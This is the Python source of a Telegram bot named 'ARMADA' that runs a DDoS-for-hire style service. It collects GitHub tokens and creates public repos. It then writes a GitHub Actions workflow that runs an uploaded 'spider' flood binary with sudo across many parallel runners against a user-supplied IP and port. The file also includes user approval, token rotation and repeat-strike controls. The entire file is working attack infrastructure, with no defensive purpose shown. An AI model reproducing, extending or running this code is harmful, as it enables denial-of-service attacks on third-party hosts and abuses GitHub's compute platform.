import os
import json
import logging
import time
import uuid
import asyncio
import random
import traceback
import html  # <-- added for escaping
from datetime import datetime, timedelta
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, ContextTypes, MessageHandler, filters, ConversationHandler, CallbackQueryHandler
from github import Github, GithubException

# ===== LOGGING =====
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# ===== ENV =====
BOT_TOKEN = os.environ.get("BOT_TOKEN", "")
ADMIN_IDS = [int(x.strip()) for x in os.environ.get("ADMIN_IDS", "").split(",") if x.strip()]
RUNNERS_PER_ATTACK = int(os.environ.get("RUNNERS_PER_ATTACK", "10"))
THREADS_PER_RUNNER = int(os.environ.get("THREADS_PER_RUNNER", "200"))
MAX_REPOS_PER_ATTACK = int(os.environ.get("MAX_REPOS_PER_ATTACK", "5"))
TOKEN_RATE_LIMIT_THRESHOLD = int(os.environ.get("TOKEN_RATE_LIMIT_THRESHOLD", "50"))

if not BOT_TOKEN:
    logger.error("BOT_TOKEN not set!")
    exit(1)

# ===== CONSTANTS =====
YML_FILE_PATH = ".github/workflows/main.yml"
WAITING_FOR_BINARY = 1

# ===== GLOBALS =====
active_attacks = {}
github_tokens = []
owners = {}
approved_users = {}
pending_users = {}
attack_counters = {}

# ============================================================
# ===== SAFE FILE OPS =====
# ============================================================
def load_json(filename, default=None):
    try:
        if os.path.exists(filename):
            with open(filename, 'r') as f:
                return json.load(f)
        return default if default is not None else {}
    except Exception as e:
        logger.error(f"Load {filename} error: {e}")
        return default if default is not None else {}

def save_json(filename, data):
    try:
        with open(filename, 'w') as f:
            json.dump(data, f, indent=2)
    except Exception as e:
        logger.error(f"Save {filename} error: {e}")

# ============================================================
# ===== INIT =====
# ============================================================
def init_data():
    global owners, github_tokens, approved_users, pending_users, attack_counters
    owners = load_json('owners.json', {})
    if not owners:
        for admin_id in ADMIN_IDS:
            owners[str(admin_id)] = {"username": f"owner_{admin_id}"}
        save_json('owners.json', owners)
    github_tokens = load_json('github_tokens.json', [])
    approved_users = load_json('approved_users.json', {})
    pending_users = load_json('pending_users.json', [])
    attack_counters = load_json('attack_counters.json', {})

init_data()

# ============================================================
# ===== TOKEN MANAGER =====
# ============================================================
class TokenManager:
    def __init__(self, tokens_list):
        self.tokens = tokens_list
        self.in_use = {}

    def _validate_token(self, token):
        try:
            g = Github(token)
            user = g.get_user()
            _ = user.login
            rate = g.get_rate_limit()
            remaining = rate.core.remaining
            return True, remaining, user.login
        except:
            return False, 0, None

    def health_check(self):
        global github_tokens
        valid = []
        for td in github_tokens:
            token = td.get('token')
            if not token:
                continue
            ok, remaining, username = self._validate_token(token)
            if ok:
                td['username'] = username
                td['remaining'] = remaining
                valid.append(td)
            else:
                logger.warning(f"Removed invalid token: {token[:10]}...")
        github_tokens = valid
        save_json('github_tokens.json', github_tokens)
        self.in_use = {td['token']: 0 for td in github_tokens}
        return len(valid)

    def get_healthy_tokens(self, max_count, exclude=[]):
        healthy = []
        candidates = [td for td in github_tokens if td['token'] not in exclude]
        candidates.sort(key=lambda x: x.get('remaining', 0), reverse=True)
        for td in candidates:
            token = td['token']
            remaining = td.get('remaining', 0)
            if remaining < TOKEN_RATE_LIMIT_THRESHOLD:
                continue
            if self.in_use.get(token, 0) < 2:
                healthy.append(td)
                if len(healthy) >= max_count:
                    break
        if len(healthy) < max_count:
            for td in candidates:
                if td not in healthy:
                    healthy.append(td)
                    if len(healthy) >= max_count:
                        break
        return healthy

    def mark_used(self, token):
        self.in_use[token] = self.in_use.get(token, 0) + 1

    def mark_released(self, token):
        if token in self.in_use:
            self.in_use[token] = max(0, self.in_use[token] - 1)

token_manager = TokenManager(github_tokens)

# ============================================================
# ===== HELPERS: CLEAN BOX DESIGN =====
# ============================================================
def make_box(title, lines):
    """Create a clean terminal box with title. All lines are plain text (escaped later if needed)."""
    max_len = max(len(l) for l in lines) if lines else 30
    width = max_len + 4
    top = "┌" + "─" * width + "┐"
    bottom = "└" + "─" * width + "┘"
    result = [top]
    if title:
        result.append(f"│  {title.center(max_len)}  │")
        result.append("├" + "─" * width + "┤")
    for line in lines:
        result.append(f"│  {line.ljust(max_len)}  │")
    result.append(bottom)
    return "\n".join(result)

def threat_level(seconds):
    if seconds <= 60:
        return "🟢 MODERATE"
    elif seconds <= 300:
        return "🟡 HIGH"
    else:
        return "🔴 CRITICAL"

def progress_bar(elapsed, total, width=20):
    if total <= 0:
        return "▓" * width
    p = int((elapsed / total) * width)
    if p > width:
        p = width
    return "▓" * p + "░" * (width - p)

def generate_session():
    return ''.join(random.choices("ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789", k=4))

def is_owner(user_id):
    return str(user_id) in owners

def is_approved(user_id):
    return str(user_id) in approved_users

def can_attack(user_id):
    return is_owner(user_id) or is_approved(user_id)

def validate_github_token(token):
    try:
        if not token or len(token) < 20:
            return False, "Token too short"
        g = Github(token)
        user = g.get_user()
        _ = user.login
        rate = g.get_rate_limit()
        if rate.core.remaining < 1:
            return False, "Rate limit exhausted"
        return True, user.login
    except GithubException as e:
        if e.status == 401:
            return False, "Invalid token (401)"
        elif e.status == 403:
            return False, "Rate limited (403)"
        elif e.status == 404:
            return False, "Token has no permissions (404)"
        else:
            return False, f"GitHub error: {e.status}"
    except Exception as e:
        return False, f"Error: {str(e)[:40]}"

# ============================================================
# ===== ATTACK MANAGEMENT =====
# ============================================================
def start_attack(attack_id, targets, user_id, duration, params):
    active_attacks[attack_id] = {
        "targets": targets,
        "user_id": user_id,
        "start_time": time.time(),
        "duration": duration,
        "params": params,
        "timer_task": None
    }
    save_json('attack_state.json', active_attacks)
    attack_counters[str(user_id)] = attack_counters.get(str(user_id), 0) + 1
    save_json('attack_counters.json', attack_counters)

def finish_attack(attack_id):
    if attack_id in active_attacks:
        timer_task = active_attacks[attack_id].get("timer_task")
        if timer_task and not timer_task.done():
            timer_task.cancel()
        for t in active_attacks[attack_id].get("targets", []):
            token_manager.mark_released(t['token'])
        del active_attacks[attack_id]
        save_json('attack_state.json', active_attacks)

def get_attack(attack_id):
    return active_attacks.get(attack_id)

# ============================================================
# ===== BINARY UPLOAD =====
# ============================================================
async def binary_upload_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user_id = update.effective_user.id
        if not is_owner(user_id):
            await update.message.reply_text("⛔ Access Denied")
            return ConversationHandler.END
        token_manager.health_check()
        if not github_tokens:
            await update.message.reply_text("❌ No tokens available. Use /add first.")
            return ConversationHandler.END
        await update.message.reply_text(
            "📤 Send the <code>spider</code> binary file.\n"
            "Type /cancel to abort.",
            parse_mode='HTML'
        )
        return WAITING_FOR_BINARY
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)[:100]}")
        return ConversationHandler.END

async def binary_upload_receive(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user_id = update.effective_user.id
        if not is_owner(user_id):
            await update.message.reply_text("⛔ Access Denied")
            return ConversationHandler.END
        if not update.message.document:
            await update.message.reply_text("❌ Please send a file.")
            return WAITING_FOR_BINARY
        file = update.message.document
        if file.file_name != "spider":
            await update.message.reply_text(f"❌ File must be named <code>spider</code>", parse_mode='HTML')
            return WAITING_FOR_BINARY

        token_manager.health_check()
        if not github_tokens:
            await update.message.reply_text("❌ No valid tokens.")
            return ConversationHandler.END

        await update.message.reply_text("⏳ Uploading to all repositories...")
        file_obj = await file.get_file()
        file_path = f"temp_{file.file_id}.bin"
        await file_obj.download_to_drive(file_path)
        with open(file_path, 'rb') as f:
            content = f.read()
        os.remove(file_path)

        success = 0
        fail = 0
        for token_data in github_tokens:
            token = token_data['token']
            repo_name = token_data['repo']
            username = token_data['username']
            try:
                g = Github(token)
                repo = g.get_repo(repo_name)
                try:
                    existing = repo.get_contents("spider")
                    repo.update_file("spider", "Update binary", content, existing.sha)
                except:
                    repo.create_file("spider", "Add binary", content)
                success += 1
                logger.info(f"Uploaded to {repo_name}")
            except Exception as e:
                fail += 1
                logger.error(f"Failed on {repo_name}: {e}")

        await update.message.reply_text(f"✅ Deployed to {success} repos, {fail} failed.")
        return ConversationHandler.END
    except Exception as e:
        await update.message.reply_text(f"❌ Upload error: {str(e)[:100]}")
        return ConversationHandler.END

async def binary_upload_cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("Cancelled.")
    return ConversationHandler.END

# ============================================================
# ===== STRIKE COMMAND (CORE) =====
# ============================================================
async def strike_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user_id = update.effective_user.id
        if not can_attack(user_id):
            await update.message.reply_text("⛔ Access Denied")
            return

        args = context.args
        if len(args) != 3:
            await update.message.reply_text("Usage: /strike <ip> <port> <time>\nExample: /strike 1.1.1.1 443 60")
            return

        ip, port_str, time_str = args
        try:
            port = int(port_str)
            duration = int(time_str)
        except:
            await update.message.reply_text("❌ Port and time must be numbers.")
            return
        if not (1 <= port <= 65535) or not (5 <= duration <= 3600):
            await update.message.reply_text("Port: 1-65535, Time: 5-3600s")
            return

        token_manager.health_check()
        if not github_tokens:
            await update.message.reply_text("❌ No GitHub tokens. Use /add")
            return

        healthy = token_manager.get_healthy_tokens(MAX_REPOS_PER_ATTACK)
        if not healthy:
            await update.message.reply_text("❌ No healthy tokens available.")
            return

        attack_id = f"{ip}:{port}:{int(time.time())}:{uuid.uuid4().hex[:4]}"
        deployed = []

        for td in healthy:
            token = td['token']
            repo_name = td['repo']
            username = td['username']
            try:
                g = Github(token)
                repo = g.get_repo(repo_name)
                try:
                    repo.get_contents("spider")
                except:
                    logger.warning(f"spider missing in {repo_name}, skipping")
                    continue

                yml = f"""name: attack
on: [push]
jobs:
  attack:
    runs-on: ubuntu-24.04
    strategy:
      matrix:
        n: [{','.join([str(i) for i in range(1, RUNNERS_PER_ATTACK+1)])}]
    steps:
    - uses: actions/checkout@v3
    - run: chmod +x spider
    - run: sudo ./spider {ip} {port} {duration} {THREADS_PER_RUNNER}
"""
                try:
                    f = repo.get_contents(YML_FILE_PATH)
                    repo.update_file(YML_FILE_PATH, f"Strike {ip}", yml, f.sha)
                except:
                    repo.create_file(YML_FILE_PATH, f"Strike {ip}", yml)

                deployed.append({
                    "username": username,
                    "repo": repo_name,
                    "token": token,
                    "url": f"https://github.com/{repo_name}/actions"
                })
                token_manager.mark_used(token)
                logger.info(f"Deployed to {repo_name}")
            except Exception as e:
                logger.error(f"Failed on {repo_name}: {e}")

        if not deployed:
            await update.message.reply_text("❌ Could not deploy to any repository.")
            return

        # Get chat title
        chat = update.effective_chat
        chat_title = chat.title if chat.title else (chat.username or "Private")
        session = generate_session()

        params = {
            "ip": ip,
            "port": port,
            "duration": duration,
            "chat_title": chat_title,
            "session": session,
            "user_id": user_id
        }
        start_attack(attack_id, deployed, user_id, duration, params)

        async def auto_finish():
            await asyncio.sleep(duration + 10)
            finish_attack(attack_id)
            logger.info(f"Auto-finished {attack_id}")
        task = asyncio.create_task(auto_finish())
        active_attacks[attack_id]["timer_task"] = task

        # Build clean professional box – all dynamic content is escaped
        total_threads = len(deployed) * RUNNERS_PER_ATTACK * THREADS_PER_RUNNER
        threat = threat_level(duration)

        lines = [
            f"IP      : {html.escape(ip)}",
            f"Port    : {port}",
            f"Session : {html.escape(session)}",
            f"Chat    : {html.escape(chat_title)}",
            f"Threads : {total_threads}",
            f"Threat  : {threat}",
            "─────────────────────────────",
            "Copy Command:",
            f"/strike {html.escape(ip)} {port} {duration}"
        ]
        box = make_box("⚡ STRIKE DEPLOYED", lines)
        keyboard = [
            [InlineKeyboardButton("🔫 Gunshot", callback_data=f"gunshot:{attack_id}")],
            [InlineKeyboardButton("🛑 Stop All", callback_data="stop_all")]
        ]
        await update.message.reply_text(f"<pre>{box}</pre>", parse_mode='HTML', reply_markup=InlineKeyboardMarkup(keyboard))

    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)[:200]}")

# ============================================================
# ===== GUNSHOT CALLBACK (Re‑deploy) =====
# ============================================================
async def gunshot_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer("🔫 Reloading...")
    attack_id = query.data.split(":")[1]
    data = get_attack(attack_id)
    if not data:
        await query.edit_message_text("❌ Strike expired.")
        return
    params = data.get("params")
    if not params:
        await query.edit_message_text("❌ Invalid strike data.")
        return

    ip = params["ip"]
    port = params["port"]
    duration = params["duration"]
    chat_title = params["chat_title"]
    user_id = params["user_id"]

    try:
        token_manager.health_check()
        if not github_tokens:
            await query.edit_message_text("❌ No GitHub tokens.")
            return
        healthy = token_manager.get_healthy_tokens(MAX_REPOS_PER_ATTACK)
        if not healthy:
            await query.edit_message_text("❌ No healthy tokens.")
            return

        new_attack_id = f"{ip}:{port}:{int(time.time())}:{uuid.uuid4().hex[:4]}"
        deployed = []
        for td in healthy:
            token = td['token']
            repo_name = td['repo']
            username = td['username']
            try:
                g = Github(token)
                repo = g.get_repo(repo_name)
                try:
                    repo.get_contents("spider")
                except:
                    continue
                yml = f"""name: attack
on: [push]
jobs:
  attack:
    runs-on: ubuntu-24.04
    strategy:
      matrix:
        n: [{','.join([str(i) for i in range(1, RUNNERS_PER_ATTACK+1)])}]
    steps:
    - uses: actions/checkout@v3
    - run: chmod +x spider
    - run: sudo ./spider {ip} {port} {duration} {THREADS_PER_RUNNER}
"""
                try:
                    f = repo.get_contents(YML_FILE_PATH)
                    repo.update_file(YML_FILE_PATH, f"Strike {ip}", yml, f.sha)
                except:
                    repo.create_file(YML_FILE_PATH, f"Strike {ip}", yml)
                deployed.append({
                    "username": username,
                    "repo": repo_name,
                    "token": token,
                    "url": f"https://github.com/{repo_name}/actions"
                })
                token_manager.mark_used(token)
            except Exception as e:
                logger.error(f"Gunshot failed on {repo_name}: {e}")

        if not deployed:
            await query.edit_message_text("❌ Gunshot failed – no repos deployed.")
            return

        session = generate_session()
        params_new = {
            "ip": ip,
            "port": port,
            "duration": duration,
            "chat_title": chat_title,
            "session": session,
            "user_id": user_id
        }
        start_attack(new_attack_id, deployed, user_id, duration, params_new)

        async def auto_finish():
            await asyncio.sleep(duration + 10)
            finish_attack(new_attack_id)
        task = asyncio.create_task(auto_finish())
        active_attacks[new_attack_id]["timer_task"] = task

        total_threads = len(deployed) * RUNNERS_PER_ATTACK * THREADS_PER_RUNNER
        threat = threat_level(duration)
        lines = [
            f"IP      : {html.escape(ip)}",
            f"Port    : {port}",
            f"Session : {html.escape(session)}",
            f"Chat    : {html.escape(chat_title)}",
            f"Threads : {total_threads}",
            f"Threat  : {threat}",
            "─────────────────────────────",
            "Copy Command:",
            f"/strike {html.escape(ip)} {port} {duration}"
        ]
        box = make_box("⚡ GUNSHOT REPEAT", lines)
        keyboard = [
            [InlineKeyboardButton("🔫 Gunshot", callback_data=f"gunshot:{new_attack_id}")],
            [InlineKeyboardButton("🛑 Stop All", callback_data="stop_all")]
        ]
        await query.edit_message_text(f"<pre>{box}</pre>", parse_mode='HTML', reply_markup=InlineKeyboardMarkup(keyboard))
    except Exception as e:
        await query.edit_message_text(f"❌ Gunshot error: {str(e)[:100]}")

# ============================================================
# ===== STATUS COMMAND =====
# ============================================================
async def status_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user_id = update.effective_user.id
        if not can_attack(user_id):
            await update.message.reply_text("⛔ Access Denied")
            return

        if not active_attacks:
            await update.message.reply_text("<pre>┌─────────────────────┐\n│  📡 IDLE             │\n└─────────────────────┘</pre>", parse_mode='HTML')
            return

        lines = ["📡 LIVE ATTACK FEED", "─────────────────────────────"]
        for aid, data in active_attacks.items():
            params = data.get("params", {})
            ip = html.escape(params.get("ip", "?"))
            port = params.get("port", "?")
            session = html.escape(params.get("session", "?"))
            chat = html.escape(params.get("chat_title", "?"))
            elapsed = int(time.time() - data['start_time'])
            duration = data.get('duration', 60)
            rem = max(0, duration - elapsed)
            bar = progress_bar(elapsed, duration, width=15)
            lines.append(f"{ip}:{port}  [{session}]")
            lines.append(f"  {bar}  {elapsed}s / {duration}s (Rem: {rem}s)")
            lines.append(f"  Chat: {chat}")
            lines.append("─────────────────────────────")
        box = make_box("📡 COMMAND CENTER", lines)
        await update.message.reply_text(f"<pre>{box}</pre>", parse_mode='HTML')
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)[:100]}")

# ============================================================
# ===== STOP COMMAND =====
# ============================================================
async def stop_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user_id = update.effective_user.id
        if not can_attack(user_id):
            await update.message.reply_text("⛔ Access Denied")
            return
        if not active_attacks:
            await update.message.reply_text("No active strikes.")
            return
        count = len(active_attacks)
        for aid in list(active_attacks.keys()):
            finish_attack(aid)
        await update.message.reply_text(f"🛑 Stopped {count} strike(s).")
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)[:100]}")

# ============================================================
# ===== ADD TOKEN COMMAND =====
# ============================================================
async def add_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user_id = update.effective_user.id
        if not is_owner(user_id):
            await update.message.reply_text("⛔ Admins only.")
            return
        if len(context.args) != 1:
            await update.message.reply_text("Usage: /add <github_token>")
            return
        token = context.args[0].strip()
        is_valid, info = validate_github_token(token)
        if not is_valid:
            await update.message.reply_text(f"❌ Invalid token: {info}")
            return
        # Check duplicate
        for t in github_tokens:
            if t.get('token') == token:
                await update.message.reply_text("Token already exists.")
                return
        g = Github(token)
        user = g.get_user()
        username = user.login
        for t in github_tokens:
            if t.get('username') == username:
                await update.message.reply_text(f"User @{username} already has a token. Remove manually.")
                return
        repo_name = f"spider-{uuid.uuid4().hex[:8]}"
        repo = user.create_repo(repo_name, private=False)
        repo.create_file(".github/workflows/main.yml", "Init", "")
        new_entry = {
            'token': token,
            'username': username,
            'repo': f"{username}/{repo_name}",
            'added_at': datetime.now().isoformat()
        }
        github_tokens.append(new_entry)
        save_json('github_tokens.json', github_tokens)
        token_manager.health_check()
        await update.message.reply_text(f"✅ Token added for @{username} (Repo: {repo_name})")
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)[:200]}")

# ============================================================
# ===== TOKENS LIST COMMAND =====
# ============================================================
async def tokens_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user_id = update.effective_user.id
        if not is_owner(user_id):
            await update.message.reply_text("⛔ Admins only.")
            return
        token_manager.health_check()
        if not github_tokens:
            await update.message.reply_text("No tokens in vault.")
            return
        lines = ["🔐 TOKEN VAULT", "─────────────────────────────"]
        for i, t in enumerate(github_tokens, 1):
            username = html.escape(t['username'])
            repo = html.escape(t['repo'])
            remaining = t.get('remaining', '?')
            lines.append(f"{i}. @{username} (rem: {remaining})")
            lines.append(f"   Repo: {repo}")
        box = make_box("🔐 TOKEN VAULT", lines)
        await update.message.reply_text(f"<pre>{box}</pre>", parse_mode='HTML')
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)[:100]}")

# ============================================================
# ===== GRANT / REVOKE =====
# ============================================================
async def grant_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user_id = update.effective_user.id
        if not is_owner(user_id):
            await update.message.reply_text("⛔ Admins only.")
            return
        if len(context.args) != 2:
            await update.message.reply_text("Usage: /grant <user_id> <days>")
            return
        target_id = int(context.args[0])
        days = int(context.args[1])
        pending_users[:] = [u for u in pending_users if str(u.get('user_id')) != str(target_id)]
        save_json('pending_users.json', pending_users)
        approved_users[str(target_id)] = {"username": f"user_{target_id}", "added_by": user_id, "days": days}
        save_json('approved_users.json', approved_users)
        await update.message.reply_text(f"✅ User {target_id} granted for {days} days.")
        try:
            await context.bot.send_message(target_id, "✅ Access Granted! Use /strike to launch.")
        except:
            pass
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)[:100]}")

async def revoke_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user_id = update.effective_user.id
        if not is_owner(user_id):
            await update.message.reply_text("⛔ Admins only.")
            return
        if len(context.args) != 1:
            await update.message.reply_text("Usage: /revoke <user_id>")
            return
        target_id = int(context.args[0])
        if str(target_id) in approved_users:
            del approved_users[str(target_id)]
            save_json('approved_users.json', approved_users)
            await update.message.reply_text(f"✅ User {target_id} revoked.")
        else:
            await update.message.reply_text("User not found.")
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)[:100]}")

# ============================================================
# ===== START / HELP / MYID / ABOUT / MATRIX =====
# ============================================================
async def start_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user_id = update.effective_user.id
        username = update.effective_user.username or "NoUsername"
        total = sum(attack_counters.values())
        user_strikes = attack_counters.get(str(user_id), 0)

        if can_attack(user_id):
            keyboard = [
                [InlineKeyboardButton("⚡ Launch Strike", callback_data="strike_help")],
                [InlineKeyboardButton("📡 Live Feed", callback_data="status")],
                [InlineKeyboardButton("🛑 Stop All", callback_data="stop_all")],
            ]
            if is_owner(user_id):
                keyboard.append([InlineKeyboardButton("🔧 Admin", callback_data="admin_panel")])

            lines = [
                f"👤 Operator : @{html.escape(username)}",
                f"Role       : {'👑 OWNER' if is_owner(user_id) else '✅ APPROVED'}",
                f"Your Strikes: {user_strikes}",
                f"Total Raids : {total}",
                "─────────────────────────────",
                f"Workers    : {RUNNERS_PER_ATTACK} / repo",
                f"Threads    : {THREADS_PER_RUNNER} / worker",
                f"Repos      : {MAX_REPOS_PER_ATTACK} parallel"
            ]
            box = make_box("🔥 ARMADA ONLINE", lines)
            await update.message.reply_text(
                f"<pre>{box}</pre>\n"
                "Use /strike <ip> <port> <time>\n"
                "Type /help for all commands.",
                parse_mode='HTML',
                reply_markup=InlineKeyboardMarkup(keyboard)
            )
        else:
            if not any(str(u.get('user_id')) == str(user_id) for u in pending_users):
                pending_users.append({"user_id": user_id, "username": username, "date": datetime.now().isoformat()})
                save_json('pending_users.json', pending_users)
                for oid in owners.keys():
                    try:
                        await context.bot.send_message(int(oid), f"📥 Request from @{html.escape(username)} ({user_id})")
                    except:
                        pass
            await update.message.reply_text("⛔ Access Denied – request submitted.")
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)[:100]}")

async def help_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "<b>🤖 ARMADA – COMMANDS</b>\n\n"
        "<b>Strike</b>\n"
        "/strike <ip> <port> <time> – Launch attack\n"
        "/status – Live feed\n"
        "/stop – Abort all strikes\n\n"
        "<b>Admin</b>\n"
        "/add <token> – Add GitHub token\n"
        "/tokens – List all tokens\n"
        "/grant <id> <days> – Grant access\n"
        "/revoke <id> – Revoke access\n"
        "/deploy – Upload spider binary\n\n"
        "<b>Utility</b>\n"
        "/start – Dashboard\n"
        "/myid – Your ID\n"
        "/about – Info\n"
        "/matrix – Fun\n"
        "/help – This menu",
        parse_mode='HTML'
    )

async def myid_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(f"🆔 <code>{update.effective_user.id}</code>", parse_mode='HTML')

async def about_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "🤖 ARMADA v3.0 (Clean Edition)\n"
        f"Multi‑repo strike system\n"
        f"Runners: {RUNNERS_PER_ATTACK} × {THREADS_PER_RUNNER} threads / repo\n"
        f"Max repos: {MAX_REPOS_PER_ATTACK}\n"
        "Built with Python + GitHub Actions",
        parse_mode='HTML'
    )

async def matrix_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "<pre>\n"
        "░░▒▒▓▓██  ██▓▓▒▒░░\n"
        "██▓▓▒▒░░  ░░▒▒▓▓██\n"
        "░░▒▒▓▓██  ██▓▓▒▒░░\n"
        "██▓▓▒▒░░  ░░▒▒▓▓██\n"
        "</pre>\n"
        "<i>Wake up, Neo...</i>",
        parse_mode='HTML'
    )

# ============================================================
# ===== CALLBACKS =====
# ============================================================
async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        query = update.callback_query
        await query.answer()
        user_id = query.from_user.id
        data = query.data

        if data == "strike_help":
            await query.edit_message_text(
                "⚡ LAUNCH STRIKE\n\n"
                "/strike <ip> <port> <time>\n"
                "Example: /strike 1.1.1.1 443 60\n\n"
                f"Uses up to {MAX_REPOS_PER_ATTACK} repos.",
                parse_mode='HTML'
            )
        elif data == "status":
            await status_cmd(update, context)
        elif data == "stop_all":
            await stop_cmd(update, context)
        elif data == "admin_panel" and is_owner(user_id):
            keyboard = [
                [InlineKeyboardButton("🔑 Tokens", callback_data="admin_tokens")],
                [InlineKeyboardButton("👥 Users", callback_data="admin_users")],
                [InlineKeyboardButton("⏳ Pending", callback_data="admin_pending")],
                [InlineKeyboardButton("📤 Deploy", callback_data="admin_deploy")],
            ]
            await query.edit_message_text("🔧 Admin Console", reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='HTML')
        elif data == "admin_tokens":
            await tokens_cmd(update, context)
        elif data == "admin_users":
            if not approved_users:
                await query.edit_message_text("No approved users.")
                return
            msg = "Approved Users:\n"
            for uid, info in approved_users.items():
                msg += f"`{uid}` – {info.get('days', '?')}d\n"
            await query.edit_message_text(msg, parse_mode='HTML')
        elif data == "admin_pending":
            if not pending_users:
                await query.edit_message_text("No pending requests.")
                return
            msg = "Pending:\n"
            for u in pending_users:
                msg += f"`{u['user_id']}` – @{html.escape(u['username'])}\n"
            await query.edit_message_text(msg, parse_mode='HTML')
        elif data == "admin_deploy":
            await query.edit_message_text("Use /deploy to upload the spider binary.")
        elif data.startswith("gunshot:"):
            await gunshot_callback(update, context)
    except Exception as e:
        logger.error(f"Callback error: {e}")

# ============================================================
# ===== ERROR =====
# ============================================================
async def error_handler(update, context):
    logger.error(f"Error: {context.error}")
    if update and update.effective_message:
        try:
            await update.effective_message.reply_text("⚠️ System error.")
        except:
            pass

# ============================================================
# ===== MAIN =====
# ============================================================
def main():
    try:
        app = Application.builder().token(BOT_TOKEN).build()

        # Binary upload conversation
        conv = ConversationHandler(
            entry_points=[CommandHandler("deploy", binary_upload_start)],
            states={WAITING_FOR_BINARY: [
                MessageHandler(filters.Document.ALL, binary_upload_receive),
                CommandHandler("cancel", binary_upload_cancel)
            ]},
            fallbacks=[CommandHandler("cancel", binary_upload_cancel)]
        )
        app.add_handler(conv)

        # Core commands (no aliases)
        app.add_handler(CommandHandler("start", start_cmd))
        app.add_handler(CommandHandler("strike", strike_cmd))
        app.add_handler(CommandHandler("status", status_cmd))
        app.add_handler(CommandHandler("stop", stop_cmd))
        app.add_handler(CommandHandler("add", add_cmd))
        app.add_handler(CommandHandler("tokens", tokens_cmd))
        app.add_handler(CommandHandler("grant", grant_cmd))
        app.add_handler(CommandHandler("revoke", revoke_cmd))
        app.add_handler(CommandHandler("help", help_cmd))
        app.add_handler(CommandHandler("myid", myid_cmd))
        app.add_handler(CommandHandler("about", about_cmd))
        app.add_handler(CommandHandler("matrix", matrix_cmd))

        app.add_handler(CallbackQueryHandler(button_callback))
        app.add_error_handler(error_handler)

        logger.info("🚀 ARMADA CLEAN EDITION ONLINE (HTML-escaped)")
        logger.info(f"⚙️ {RUNNERS_PER_ATTACK} runners × {THREADS_PER_RUNNER} threads × {MAX_REPOS_PER_ATTACK} repos")
        app.run_polling(allowed_updates=Update.ALL_TYPES)
    except Exception as e:
        logger.error(f"Main error: {e}")
        traceback.print_exc()

if __name__ == "__main__":
    main()
